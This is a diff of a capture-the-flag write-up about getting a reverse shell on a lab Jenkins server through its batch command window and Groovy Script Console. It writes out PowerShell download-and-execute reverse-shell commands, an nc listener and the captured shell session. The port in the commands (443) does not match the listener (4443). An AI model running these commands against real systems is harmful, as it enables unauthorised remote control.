@@ -90,6 +90,8 @@ window that allows for executing Windows batch commands.
 |:--:|
 | Windows batch commands window in project configuration|
 
+Test with: `whoami`.
+
 2. Jenkins also comes with a "Script Console" administrative tool, which allows authenticated users to run scripts 
 using Apache [Groovy](http://www.groovy-lang.org/), a Java-syntax-compatible object-oriented programming language 
 for the Java platform. On the mainpage on the left, click on "Manage Jenkins", scroll down below the warnings, 
@@ -99,29 +101,50 @@ and click [script console](https://www.jenkins.io/doc/book/managing/script-conso
 |:--:|
 | [https://www.jenkins.io/doc/book/managing/script-console/](https://www.jenkins.io/doc/book/managing/script-console/) |
 
-A PowerShell command to execute a reverse shell might work in both. "Nishang" contains a lot of reverse shell payloads and more.
+Test using `print` to display the output of the command: `print "whoami".execute().text`.
+
+A PowerShell command to execute a reverse shell might work in both. `Nishang` contains a lot of reverse shell payloads 
+and more.
 
 If on Kali, copy `Invoke-PowershellTcp.ps1` from `/usr/share/nishang/Shells`. If not on Kali, 
 [download Invoke-PowershellTcp.ps1 from Gihub](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1).
 
-I decided not to copy and just host the entire Nishang Shells directory, by starting a server in 
-`/usr/share/nishang/Shells`:
+I decided not to copy and just host the entire Nishang Shells directory, by starting a server in the 
+`/usr/share/nishang/Shells` directory:
 
 	# python3 -m http.server 80
     Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
-Option 1: Execute in windows batch command window - Test with: `whoami`, and if works:
+Start a listener:
+
+    # nc -lvnp 4443
+    Ncat: Version 7.92 ( https://nmap.org/ncat )
+
+Option 1: Execute in windows batch command window:
 
 ```text
-powershell iex (New-Object Net.WebClient).DownloadString(‘http://<IP address attack machine>:<http-server port>/Invoke-PowerShellTcp.ps1’);Invoke-PowerShellTcp -Reverse -IPAddress <IP address attack machine> -Port <netcat listener port>
+powershell iex (New-Object Net.WebClient).DownloadString(‘http://<IP address attack machine>:80/Invoke-PowerShellTcp.ps1’);Invoke-PowerShellTcp -Reverse -IPAddress <IP address attack machine> -Port 443
 ```
 
-Option 2: Script console - Test using "print" to display the output of the command: `print "whoami".execute().text`, 
-and if works:
+Option 2: Script console:
 
 ```text
-print "powershell IEX(New-Object Net.WebClient).downloadString('http://<IP address attack machine>:<http-server port>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <IP address attack machine> -Port <netcat listener port>".execute().text
+print "powershell IEX(New-Object Net.WebClient).downloadString('http://<IP address attack machine>:80/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <IP address attack machine> -Port 443".execute().text
 ```
+
+In the terminal with the listener:
+
+    # nc -lvnp 4443
+    Ncat: Version 7.92 ( https://nmap.org/ncat )
+    Ncat: Listening on :::4443
+    Ncat: Listening on 0.0.0.0:4443
+    Ncat: Connection from 10.10.184.145.
+    Ncat: Connection from 10.10.184.145:49217.
+    Windows PowerShell running as user bruce on ALFRED
+    Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+    
+    PS C:\Program Files (x86)\Jenkins>
+
 Get the flag:
 
     PS C:\Program Files (x86)\Jenkins> cd ..\..\Users\bruce\Desktop
